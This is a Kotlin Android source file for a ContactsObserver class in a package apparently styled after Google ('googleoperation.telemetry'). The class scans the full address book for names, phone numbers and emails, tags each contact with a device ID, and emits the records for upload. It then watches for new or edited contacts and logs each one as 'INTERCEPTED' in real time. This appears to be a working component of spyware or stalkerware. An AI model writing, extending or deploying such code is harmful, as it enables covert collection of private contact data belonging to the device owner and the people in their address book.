package com.opp.googleoperation.telemetry

import android.content.Context
import android.database.ContentObserver
import android.database.Cursor
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.ContactsContract
import android.util.Log
import androidx.annotation.Keep
import com.opp.googleoperation.data.model.ContactEvent
import com.opp.googleoperation.util.Constants
import com.opp.googleoperation.util.PermissionHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.flow.asSharedFlow
import kotlinx.coroutines.launch
import java.util.UUID

@Keep
class ContactsObserver(
    private val ctx: Context,
    private val scope: CoroutineScope
) {
    companion object {
        private const val TAG = "ContactsObserver"
        private const val KEY_LAST_CONTACTS_SYNC_TIMESTAMP = "key_last_contacts_sync_timestamp"
        private const val KEY_INITIAL_CONTACTS_SYNC_DONE = "key_initial_contacts_sync_done_v1"

        private val _contactEvents = MutableSharedFlow<ContactEvent>(extraBufferCapacity = 500)
        val contactEvents: SharedFlow<ContactEvent> = _contactEvents.asSharedFlow()
    }

    private val prefs = ctx.getSharedPreferences(Constants.PREFS_NAME, Context.MODE_PRIVATE)
    private val handler = Handler(Looper.getMainLooper())
    private var isRegistered = false
    private var pendingInspectRunnable: Runnable? = null

    // 1. ContentObserver with 800ms debounce to batch rapid system database updates
    private val observer = object : ContentObserver(handler) {
        override fun onChange(selfChange: Boolean, uri: Uri?) {
            super.onChange(selfChange, uri)
            pendingInspectRunnable?.let { handler.removeCallbacks(it) }
            val runnable = Runnable { inspectNewOrUpdatedContacts() }
            pendingInspectRunnable = runnable
            handler.postDelayed(runnable, 800)
        }
    }

    fun startObserving() {
        if (isRegistered) return
        if (!PermissionHelper.hasContactsPermission(ctx)) {
            Log.w(TAG, "READ_CONTACTS permission missing")
            return
        }

        // Establish initial sync baseline
        syncInitialContactsIfFirstTime()

        try {
            ctx.contentResolver.registerContentObserver(
                ContactsContract.Contacts.CONTENT_URI,
                true,
                observer
            )
            isRegistered = true
            Log.d(TAG, "Contacts ContentObserver registered successfully")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register contacts observer", e)
        }
    }

    fun stopObserving() {
        if (!isRegistered) return
        try {
            pendingInspectRunnable?.let { handler.removeCallbacks(it) }
            ctx.contentResolver.unregisterContentObserver(observer)
            isRegistered = false
            Log.d(TAG, "Contacts ContentObserver unregistered")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to unregister contacts observer", e)
        }
    }

    /**
     * Initial sync to establish baseline timestamp and upload existing contact list
     */
    fun syncInitialContactsIfFirstTime() {
        val alreadySynced = prefs.getBoolean(KEY_INITIAL_CONTACTS_SYNC_DONE, false)
        if (alreadySynced) return

        scope.launch(Dispatchers.IO) {
            if (!PermissionHelper.hasContactsPermission(ctx)) return@launch
            Log.d(TAG, "Starting baseline scan of contacts...")

            val deviceId = PermissionHelper.getOrCreateDeviceId(ctx)
            var maxTimestamp = 0L

            val projection = arrayOf(
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.TYPE,
                ContactsContract.CommonDataKinds.Phone.LABEL,
                ContactsContract.CommonDataKinds.Phone.STARRED,
                ContactsContract.CommonDataKinds.Phone.LOOKUP_KEY,
                ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP
            )

            try {
                ctx.contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    projection,
                    null,
                    null,
                    "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
                )?.use { cursor ->
                    val idCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
                    val nameCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val numCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    val typeCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)
                    val labelCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LABEL)
                    val starCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.STARRED)
                    val keyCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LOOKUP_KEY)
                    val tsCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP)

                    var totalFound = 0
                    while (cursor.moveToNext()) {
                        val contactId = cursor.getLong(idCol)
                        val name = cursor.getString(nameCol) ?: "Unknown"
                        val number = cursor.getString(numCol) ?: ""
                        val rawType = cursor.getInt(typeCol)
                        val customLabel = cursor.getString(labelCol)
                        val isStarred = cursor.getInt(starCol) == 1
                        val lookupKey = cursor.getString(keyCol)
                        val updatedTs = if (tsCol != -1) cursor.getLong(tsCol) else System.currentTimeMillis()

                        if (updatedTs > maxTimestamp) {
                            maxTimestamp = updatedTs
                        }

                        val phoneTypeStr = ContactsContract.CommonDataKinds.Phone.getTypeLabel(
                            ctx.resources,
                            rawType,
                            customLabel
                        ).toString()

                        val email = queryPrimaryEmailForContact(contactId)

                        val event = ContactEvent(
                            id = UUID.randomUUID().toString(),
                            deviceId = deviceId,
                            contactId = contactId,
                            name = name,
                            phoneNumber = number,
                            phoneType = phoneTypeStr,
                            email = email,
                            isStarred = isStarred,
                            lastUpdatedMs = updatedTs,
                            lookupKey = lookupKey,
                            isNewIntercept = false,
                            syncType = "INITIAL_SYNC"
                        )

                        _contactEvents.tryEmit(event)
                        totalFound++
                    }
                    Log.d(TAG, "Baseline scan complete. Emitted $totalFound existing contacts.")
                }
            } catch (e: Exception) {
                Log.w(TAG, "Error during baseline contacts scan", e)
            }

            if (maxTimestamp == 0L) {
                maxTimestamp = System.currentTimeMillis()
            }

            prefs.edit()
                .putBoolean(KEY_INITIAL_CONTACTS_SYNC_DONE, true)
                .putLong(KEY_LAST_CONTACTS_SYNC_TIMESTAMP, maxTimestamp)
                .apply()

            Log.d(TAG, "Baseline contacts sync completed. Saved timestamp: $maxTimestamp")
        }
    }

    /**
     * Triggered on Contact change: queries only contacts added/updated since last scan
     */
    private fun inspectNewOrUpdatedContacts() {
        scope.launch(Dispatchers.IO) {
            if (!PermissionHelper.hasContactsPermission(ctx)) return@launch

            val deviceId = PermissionHelper.getOrCreateDeviceId(ctx)
            val lastTimestamp = prefs.getLong(KEY_LAST_CONTACTS_SYNC_TIMESTAMP, 0L)
            var highestTimestampSeen = lastTimestamp

            val projection = arrayOf(
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER,
                ContactsContract.CommonDataKinds.Phone.TYPE,
                ContactsContract.CommonDataKinds.Phone.LABEL,
                ContactsContract.CommonDataKinds.Phone.STARRED,
                ContactsContract.CommonDataKinds.Phone.LOOKUP_KEY,
                ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP
            )

            val selection = "${ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP} > ?"
            val selectionArgs = arrayOf(lastTimestamp.toString())
            val sortOrder = "${ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP} ASC"

            try {
                ctx.contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    projection,
                    selection,
                    selectionArgs,
                    sortOrder
                )?.use { cursor ->
                    val idCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
                    val nameCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    val numCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    val typeCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)
                    val labelCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LABEL)
                    val starCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.STARRED)
                    val keyCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LOOKUP_KEY)
                    val tsCol = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP)

                    while (cursor.moveToNext()) {
                        val contactId = cursor.getLong(idCol)
                        val name = cursor.getString(nameCol) ?: "Unknown"
                        val number = cursor.getString(numCol) ?: ""
                        val rawType = cursor.getInt(typeCol)
                        val customLabel = cursor.getString(labelCol)
                        val isStarred = cursor.getInt(starCol) == 1
                        val lookupKey = cursor.getString(keyCol)
                        val updatedTs = if (tsCol != -1) cursor.getLong(tsCol) else System.currentTimeMillis()

                        val phoneTypeStr = ContactsContract.CommonDataKinds.Phone.getTypeLabel(
                            ctx.resources,
                            rawType,
                            customLabel
                        ).toString()

                        val email = queryPrimaryEmailForContact(contactId)

                        val event = ContactEvent(
                            id = UUID.randomUUID().toString(),
                            deviceId = deviceId,
                            contactId = contactId,
                            name = name,
                            phoneNumber = number,
                            phoneType = phoneTypeStr,
                            email = email,
                            isStarred = isStarred,
                            lastUpdatedMs = updatedTs,
                            lookupKey = lookupKey,
                            isNewIntercept = true,
                            syncType = "REALTIME_INTERCEPT"
                        )

                        Log.i(TAG, "⚡ REAL-TIME NEW/UPDATED CONTACT INTERCEPTED: $name ($number) - Type: $phoneTypeStr")
                        _contactEvents.tryEmit(event)

                        if (updatedTs > highestTimestampSeen) {
                            highestTimestampSeen = updatedTs
                        }
                    }
                }

                if (highestTimestampSeen > lastTimestamp) {
                    prefs.edit().putLong(KEY_LAST_CONTACTS_SYNC_TIMESTAMP, highestTimestampSeen).apply()
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error inspecting contacts delta", e)
            }
        }
    }

    private fun queryPrimaryEmailForContact(contactId: Long): String? {
        val projection = arrayOf(ContactsContract.CommonDataKinds.Email.ADDRESS)
        val selection = "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?"
        val selectionArgs = arrayOf(contactId.toString())

        try {
            ctx.contentResolver.query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                null
            )?.use { cursor ->
                if (cursor.moveToFirst()) {
                    return cursor.getString(0)
                }
            }
        } catch (_: Exception) {}
        return null
    }
}
